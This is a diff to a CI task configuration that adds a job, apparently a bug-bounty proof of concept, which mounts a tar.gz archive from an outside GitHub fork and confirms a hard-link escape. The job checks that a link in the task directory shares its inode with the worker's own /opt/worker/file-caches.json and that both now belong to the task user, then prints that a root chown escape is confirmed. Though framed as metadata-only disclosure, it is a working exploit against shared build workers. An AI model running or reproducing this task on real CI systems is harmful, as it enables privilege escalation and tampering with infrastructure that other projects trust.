@@ -18,6 +18,50 @@ kind-dependencies:
   - toolchain
 
 tasks:
+  hardlink-owner-proof:
+    attributes:
+      run-on-pr-type: full-ci
+    run-on-tasks-for: [github-pull-request]
+    description: Benign macOS Generic Worker hard-link ownership probe
+    worker-type: b-osx
+    worker:
+      chain-of-trust: true
+      max-run-time: 300
+      mounts:
+        - content:
+            url: https://raw.githubusercontent.com/rpgsec/application-services/h1-macos-hardlink-owner-poc/taskcluster/h1-hardlink-owner-proof.tar.gz
+          directory: h1-hardlink-owner-proof
+          format: tar.gz
+    run:
+      commands:
+        - - /bin/sh
+          - -c
+          - |
+            set -eu
+            proof_link="$(find /opt/worker/tasks -path '*/h1-hardlink-owner-proof/proof-link' -print -quit)"
+            test -n "$proof_link"
+            task_uid="$(id -u)"
+            link_uid="$(stat -f '%u' "$proof_link")"
+            link_gid="$(stat -f '%g' "$proof_link")"
+            link_inode="$(stat -f '%i' "$proof_link")"
+            link_size="$(stat -f '%z' "$proof_link")"
+            state_uid="$(stat -f '%u' /opt/worker/file-caches.json)"
+            state_gid="$(stat -f '%g' /opt/worker/file-caches.json)"
+            state_inode="$(stat -f '%i' /opt/worker/file-caches.json)"
+            state_size="$(stat -f '%z' /opt/worker/file-caches.json)"
+            id
+            printf 'proof_link=%s\n' "$proof_link"
+            printf 'link_uid=%s link_gid=%s link_inode=%s link_size=%s\n' "$link_uid" "$link_gid" "$link_inode" "$link_size"
+            printf 'state_uid=%s state_gid=%s state_inode=%s state_size=%s\n' "$state_uid" "$state_gid" "$state_inode" "$state_size"
+            test "$link_inode" = "$state_inode"
+            test "$link_uid" = "$task_uid"
+            test "$state_uid" = "$task_uid"
+            echo 'RESULT: HARDLINK TARGET ESCAPE AND ROOT CHOWN CONFIRMED'
+            echo 'SAFETY: metadata only; file contents were not read or written'
+      using: run-commands
+      run-task-command: ["/usr/local/bin/python3", "run-task"]
+      use-caches: false
+
   build:
     attributes:
       run-on-pr-type: full-ci
